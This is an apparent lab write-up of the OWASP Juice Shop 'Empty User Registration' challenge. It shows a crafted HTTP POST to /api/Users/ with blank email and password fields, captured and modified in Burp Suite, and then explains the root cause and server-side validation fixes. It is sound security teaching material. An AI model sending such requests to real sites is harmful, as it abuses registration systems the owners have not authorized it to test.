# OWASP Juice Shop – Empty User Registration

## Category :

**Improper Input Validation**

### Challenge Name

**Empty User Registration**

### Difficulty

**2 Star**

## Objective

- Register a user with an **empty email** and **empty password**.

## Description

- This challenge demonstrates missing server-side validation during user registration.  
- The application accepts blank values for critical fields such as email and password.

## Registration Page

```http
http://192.168.1.122:3000/#/register
````

## Vulnerable Endpoint

```text
/api/Users/
```

## Step-by-Step Solution

### Step 1: Open Registration Page

- Navigate to:

```text
#/register
```

### Step 2: Fill Normal Form Once 

- Capture a valid registration request in Burp Suite Proxy.

### Step 3: Send Request to Repeater

- Modify the request body.

#### Working Exploit Request

```http
POST /api/Users/ HTTP/1.1
Host: 192.168.1.122:3000
Content-Type: application/json

{
  "email":"",
  "password":"",
  "passwordRepeat":"",
  "securityQuestion":{
    "id":2,
    "question":"Mother's maiden name?"
  },
  "securityAnswer":"12414"
}
```

![[Pasted image 20260421163723.png]]

### Step 4: Send Request

If accepted, the challenge is solved.

## Why It Works

- The backend fails to properly validate required fields and accepts empty strings.

## Vulnerability Type

### Improper Input Validation

- Critical input fields are not validated server-side.

## Impact

- Creation of invalid accounts
    
- Broken authentication flows
    
- Data integrity issues
    
- Unexpected application behavior
    
- Abuse of user system

## Severity

**Medium**

## Root Cause

- Missing required-field validation
    
- Trusting client-side controls only
    
- No backend schema enforcement

## Prevention

- Validate all inputs server-side
    
- Reject empty email/password fields
    
- Enforce password policy
    
- Normalize and sanitize input
    
- Use schema validation

## OWASP Mapping

- A04: Insecure Design
    
- A05: Security Misconfiguration

## Key Lesson

- Client-side validation is never enough.  
- Always enforce validation on the server.

## Conclusion

This challenge shows how accepting blank credentials can break account integrity and authentication controls.